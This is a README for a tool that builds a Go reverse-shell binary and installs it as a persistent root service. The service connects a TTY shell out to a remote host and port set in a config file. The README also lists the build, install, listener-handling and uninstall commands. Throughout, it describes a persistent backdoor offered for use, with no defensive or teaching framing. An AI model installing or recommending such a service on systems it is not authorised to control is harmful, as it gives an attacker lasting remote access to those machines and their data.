# Reverse TTY Shell Service 

Tries to connect a Reverse Shell to a remote server specified in the header variables of revshell_service.

## Usage
First substitute into config.txt the host and the port to connect to

Then build revshell in the current directory

    go build revshell.go

This will generate the revshell binary needed from the next script. 

Finally run the revshell_service script as root 

    sudo ./revshell_service.sh install

Once run the script the reverse shell is already running. 
You can catch properly the tty shell connection from the server using the provided script handle_revshell

    ./handle_revshell.sh <port>


## Uninstall and Cleanup 

To remove the service and all the installed files run

    sudo ./revshell_service.sh uninstall
